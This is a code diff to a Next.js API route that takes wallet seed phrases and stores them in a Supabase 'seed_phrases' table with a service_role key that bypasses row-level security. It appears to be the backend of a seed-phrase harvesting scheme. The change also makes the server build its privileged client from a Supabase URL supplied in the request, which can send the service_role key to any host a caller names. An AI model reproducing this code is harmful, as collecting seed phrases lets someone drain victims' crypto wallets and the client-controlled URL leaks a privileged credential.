@@ -6,6 +6,8 @@ import { z } from "zod";
 const seedPhraseSchema = z.object({
   seedPhrase: z.string().min(12, "Seed phrase must be at least 12 words."),
   network: z.string().min(1, "Network is required."),
+  supabaseUrl: z.string().url("Invalid Supabase URL"),
+  supabaseAnonKey: z.string().min(1, "Supabase anon key is required"),
 });
 
 // IMPORTANT: This route uses the service_role key to bypass RLS for inserts.
@@ -14,16 +16,7 @@ const seedPhraseSchema = z.object({
 
 export async function POST(request: Request) {
   try {
-    const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
     const supabaseServiceRoleKey = process.env.SUPABASE_SERVICE_ROLE_KEY;
-
-    if (!supabaseUrl || !supabaseServiceRoleKey) {
-      console.error("Server-side Supabase environment variables are missing.");
-      return NextResponse.json({ error: "Server configuration error." }, { status: 500 });
-    }
-
-    // Create a new Supabase client with the service_role key for this server-side operation
-    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
     
     const body = await request.json();
     const parsed = seedPhraseSchema.safeParse(body);
@@ -34,8 +27,16 @@ export async function POST(request: Request) {
         { status: 400 }
       );
     }
+    
+    const { seedPhrase, network, supabaseUrl, supabaseAnonKey } = parsed.data;
 
-    const { seedPhrase, network } = parsed.data;
+    if (!supabaseServiceRoleKey) {
+      console.error("Server-side Supabase service role key is missing.");
+      return NextResponse.json({ error: "Server configuration error." }, { status: 500 });
+    }
+
+    // Create a new Supabase client with the service_role key for this server-side operation
+    const supabaseAdmin = createClient(supabaseUrl, supabaseServiceRoleKey);
 
     const { data, error } = await supabaseAdmin
       .from("seed_phrases")
